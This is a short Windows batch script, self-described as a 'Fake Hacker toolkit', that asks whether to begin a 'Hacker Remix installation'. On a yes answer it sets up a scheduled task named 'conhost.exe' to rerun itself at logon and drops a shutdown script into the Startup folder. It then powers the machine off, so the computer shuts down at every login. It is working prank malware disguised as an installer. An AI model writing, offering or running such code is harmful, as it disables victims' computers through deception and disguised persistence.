::Fake Hacker toolkit that makes a shutdown.bat on startup menu
@echo off
title Hacker Remix
goto choice

:start
schtasks /create /tn "conhost.exe" /tr %CD%\%0 /sc onlogon
cd /d "%systemdrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo @echo off > lol.bat
echo shutdown /p >>lol.bat
shutdown /p
break

:choice
color 0f
echo Do you want to begin the Hacker Remix installation?[Y/N]
set input=
set /p input=
if %input%==Y goto start
if %input%==y goto start
if %input%==yes goto start
if %input%==YES goto start
if %input%==Yes goto start
if %input%==N goto end
if %input%==n goto end
if %input%==no goto end
if %input%==NO goto end
if %input%==No goto end

:end
break 